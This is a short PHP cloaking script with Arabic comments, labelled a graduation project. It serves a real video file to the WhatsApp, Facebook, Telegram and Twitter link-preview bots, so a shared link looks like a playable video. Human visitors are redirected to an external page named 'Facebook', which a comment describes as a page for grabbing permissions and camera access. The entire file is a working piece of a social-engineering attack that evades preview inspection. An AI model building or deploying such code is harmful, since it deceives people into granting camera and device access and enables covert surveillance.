<?php
/**
 * مشروع التخرج: نظام التخفي البرمجي (Cloaking)
 * هذا الملف يقوم بالتمييز بين بوتات التواصل الاجتماعي والمستخدم الحقيقي
 */

$userAgent = $_SERVER['HTTP_USER_AGENT'];
$targetPage = "https://appsyria00.github.io/Facebook/"; // صفحة مشروعك الأساسية
$previewVideo = "../1.mp4"; // مسار الفيديو الذي سيظهر كمعاينة

// 1. فحص ما إذا كان الزائر هو "بوت" (واتساب، فيسبوك، تلجرام)
if (preg_match('/WhatsApp|facebookexternalhit|TelegramBot|Twitterbot/i', $userAgent)) {
    
    // إرسال ترويسة تخبر التطبيق أن هذا ملف فيديو حقيقي
    header('Content-Type: video/mp4');
    header('Content-Disposition: inline; filename="video.mp4"');
    header('Content-Length: ' . filesize($previewVideo));
    
    // قراءة ملف الفيديو وإرساله للبوت ليظهر زر التشغيل (Play)
    readfile($previewVideo);
    exit;
} 

// 2. إذا كان الزائر إنساناً (يستخدم متصفح عادي)
else {
    // توجيهه فوراً لصفحة سحب الصلاحيات والكاميرا
    header("Location: " . $targetPage);
    exit;
}
?>
